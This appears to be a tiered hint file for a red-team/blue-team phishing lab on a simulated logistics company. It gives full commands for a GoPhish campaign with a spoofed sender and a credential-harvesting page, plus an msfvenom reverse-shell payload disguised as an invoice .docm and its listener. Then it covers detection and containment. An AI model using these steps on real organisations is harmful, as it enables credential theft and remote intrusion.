L1: Step 1: Effective phishing requires research. A generic email gets caught by spam filters and ignored by users. A targeted, specific pretext gets opened.
Step 2: OSINT (Open Source Intelligence) means gathering information from public sources: company websites, LinkedIn, job postings, press releases.
Step 3: For a logistics company, think about what emails employees normally receive: invoices, shipment notifications, delivery confirmations. Your pretext should fit their daily workflow.
L2: Step 1: Use OSINT tools to enumerate the target domain. Find email naming conventions (firstname.lastname@, flastname@, etc.), employee names, and job titles.
Step 2: Check the GoPhish admin interface at 172.20.3.40:3333 — it may have pre-configured target lists and templates for this scenario.
Step 3: A logistics company invoice or shipment update is the most natural pretext. Include specific details (tracking numbers, amounts) to increase credibility.
L3: Step 1: Run `theHarvester -d orion-logistics.local -b all` to enumerate emails and subdomains.
Step 2: Access GoPhish admin: `curl http://172.20.3.40:3333` — check for pre-configured targets and templates.
Step 3: Note the email format, any employee names, and the company domain. These inform your phishing pretext.
Step 4: Document your OSINT findings in the notebook with #finding tags — this is the 'Intelligence Gathering' phase of your methodology.

L1: Step 1: A phishing campaign has three components: the email template (what the target sees), the sending profile (how it's delivered), and the landing page or payload (what happens when they click).

Step 2: GoPhish manages all three. The sending profile connects to an SMTP server (Postfix at 172.20.3.20). The template is the email content. The landing page captures credentials or serves a payload.
Step 3: Tracking is critical — GoPhish embeds tracking pixels and unique links so you can measure: who opened, who clicked, who submitted credentials.
L2: Step 1: In GoPhish, configure a Sending Profile that uses the Postfix relay at 172.20.3.20:25. This sends emails that appear to come from the orion-logistics domain.
Step 2: Create or select an email template. Use a logistics-themed pretext: 'Invoice #INV-2026-0412 requires your approval.' Include urgency cues.
Step 3: Set up a landing page that mimics the Orion Logistics login portal. GoPhish captures submitted credentials automatically.
L3: Step 1: Access GoPhish admin at http://172.20.3.40:3333 (default creds are usually admin:gophish or check the scenario docs).
Step 2: Create Sending Profile: SMTP host = 172.20.3.20:25, From = it-support@orion-logistics.local
Step 3: Create or select the 'Orion_Q4_Invoice' email template. Enable tracking.
Step 4: Create a landing page that captures username/password. Import from URL if available, or build a simple form.
Step 5: Document your campaign setup as #evidence — the sending profile, template, and landing page configuration.

L1: Step 1: For maximum impact, you need a payload that executes when the target interacts with it. Document-based payloads (macro-enabled Word/Excel) are the most common real-world vector.
Step 2: A reverse shell payload 'calls home' to your machine. You set up a listener first, then when the payload executes, you get a command shell on the victim's machine.
Step 3: The payload must look legitimate — an invoice.docm (macro-enabled Word) is natural for a logistics company.
L2: Step 1: Generate a reverse TCP payload using msfvenom. The format should match your pretext — .docm for an invoice.
Step 2: Set LHOST to your Kali IP on the scenario network, LPORT to 4444 (or any available port).
Step 3: Before launching the campaign, start a listener on your machine to receive the callback.
L3: Step 1: Generate payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.20.3.10 LPORT=4444 -f docm -o invoice_Q4.docm`

Step 2: Start listener: open a new terminal and run `nc -lvp 4444` or use msfconsole: `msfconsole -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 172.20.3.10; set LPORT 4444; run'`
Step 3: Attach the payload to your GoPhish campaign email template, or host it on the landing page.
Step 4: Document: payload type, LHOST, LPORT, file hash. Tag as #evidence.

L1: Step 1: Everything is set up — pretext, template, payload, listener. Launching the campaign sends the emails. GoPhish will track delivery, opens, and clicks in real time.
Step 2: The callback on your listener is the proof of execution. When the victim opens the document and enables macros, your reverse shell fires.
Step 3: Post-access: run basic commands to prove the level of access you achieved. whoami, hostname, ipconfig — these prove you have a shell on the target.
L2: Step 1: Launch the campaign in GoPhish. Monitor the dashboard for email delivery confirmations, tracking pixel fires (opens), and link clicks.
Step 2: Watch your listener — a connection from 172.20.3.30 (the victim endpoint) confirms successful execution.
Step 3: On the shell, gather proof: system info, user info, network info. Document everything.
L3: Step 1: In GoPhish: Campaigns → New Campaign → select template, targets, sending profile → Launch.
Step 2: Monitor GoPhish dashboard: watch for 'Email Sent' → 'Email Opened' → 'Clicked Link' progression.
Step 3: Watch your listener terminal. When you see a connection: run `whoami`, `hostname`, `ipconfig`.
Step 4: Take screenshots / document the shell session. Tag as #evidence. This is your primary proof of campaign success.

L1: Step 1: The phishing simulation report is your deliverable. It quantifies the organization's human security risk with real data.
Step 2: Key metrics: delivery rate, open rate, click rate, execution rate. Compare against industry benchmarks (typically 20-30% click rate for untrained users).
Step 3: Recommendations should be specific and actionable: security awareness training, DMARC enforcement, email gateway improvements.
L2: Step 1: Pull campaign statistics from GoPhish: emails sent, opened, clicked, submitted.
Step 2: Calculate rates and compare to benchmarks. A >30% click rate indicates critical need for security awareness training.
Step 3: Write recommendations: DMARC policy set to p=reject, mandatory security awareness training quarterly, email gateway sandbox for attachments.
L3: Step 1: Export GoPhish campaign results. Calculate: click_rate = clicks/sent * 100.
Step 2: Structure report: Executive Summary → Campaign Parameters → Results → Technical Gaps → Recommendations.
Step 3: Key recommendations: enforce DMARC p=reject, deploy email sandbox for attachments, quarterly phishing simulation testing, mandatory security awareness training.
Step 4: Use the report builder to export. Ensure all #finding and #evidence tags are included.

L1: Step 1: A suspicious email has been reported. Your first task is to verify whether it's legitimately from the claimed sender by checking email authentication headers.
Step 2: Three protocols protect email authenticity: SPF (authorized sending IPs), DKIM (cryptographic signature), and DMARC (policy alignment). A spoofed email will fail at least one.
Step 3: Also check: does the Reply-To match the From? Is the sender domain slightly misspelled (homograph attack)? Are there unusual attachment types?
L2: Step 1: Examine the email headers. Look for Authentication-Results showing SPF, DKIM, and DMARC pass/fail status.
Step 2: Check if the sending IP matches the domain's SPF record. A 'softfail' or 'fail' result indicates the email wasn't sent from an authorized server.
Step 3: Determine scope: how many employees received this email? Search the mail logs for the same subject line or sender.
L3: Step 1: In the SIEM, filter for mail-related events. Look for the subject line or sender address.
Step 2: In the terminal: `grep 'invoice' /var/log/mail.log | head -20` to find the relevant email entries.
Step 3: Check the authentication results: `grep -A5 'Authentication-Results' /var/log/mail.log | grep -E 'spf|dkim|dmarc'`
Step 4: Count recipients: `grep '<subject>' /var/log/mail.log | grep 'to=' | wc -l`. Document: sender IP, authentication results, recipient count as #ioc and #finding.

L1: Step 1: If the phishing email was opened, you need to determine if the payload executed. Macro execution in Office documents spawns child processes — that's the detection point.
Step 2: Event 4688 (Process Creation) shows process parent-child relationships. WINWORD.EXE spawning cmd.exe or powershell.exe is the definitive macro execution indicator.
Step 3: PowerShell script block logging (Event 4104) captures the actual commands executed — look for download cradles (IEX, DownloadString, WebClient).
L2: Step 1: Search for Event 4688 where the parent process is a Microsoft Office application. Any Office process spawning a shell is suspicious.
Step 2: If PowerShell was used, Event 4104 captures the full script. Look for encoded commands (Base64) and network download functions.
Step 3: Check for persistence: Event 4698 (Scheduled Task Created) or Event 7045 (Service Installed) after the macro execution timestamp.
L3: Step 1: Search SIEM for process creation events: filter for 'WINWORD' or '4688' in events.
Step 2: In terminal: `grep '4688' /var/log/scenario/security.log | grep -i 'word\|excel' | head -10`
Step 3: Check for PowerShell activity: `grep '4104' /var/log/scenario/security.log | grep -i 'download\|IEX\|webclient'`
Step 4: If execution confirmed: note the affected hostname, user, timestamp, and C2 callback IP. Escalate to CRITICAL. Tag as #finding.

L1: Step 1: Execution confirmed — the endpoint has an active C2 connection. Containment must be fast but careful. Sequence: preserve evidence → block C2 → isolate host → reset credentials.
Step 2: Capturing volatile evidence (running processes, network connections) BEFORE isolation is critical — once you isolate, some evidence disappears.
Step 3: Block the C2 IP at the perimeter firewall, not just on the endpoint. The attacker may have compromised the endpoint's local firewall.
L2: Step 1: Capture volatile evidence: running processes and active network connections on the compromised host.
Step 2: Block the C2 server IP at the perimeter firewall. Check if any other hosts are communicating with the same IP.
Step 3: Isolate the compromised endpoint at the network level. Force password resets for any accounts that were active on that machine.
L3: Step 1: Evidence capture (if accessible): `netstat -ano | grep ESTABLISHED` and `tasklist /v` on the endpoint.
Step 2: Identify C2 IP from network events: `grep 'ESTABLISHED.*:4444' /var/log/scenario/connections.log`
Step 3: Document the C2 IP, affected hostname, and affected user account as #ioc entries.
Step 4: Containment actions for your report: firewall block rule, endpoint isolation, credential reset list. Write up as #remediation.
Step 5: Check for lateral movement: did the compromised account access any other hosts? Search for its username in 4624 events.
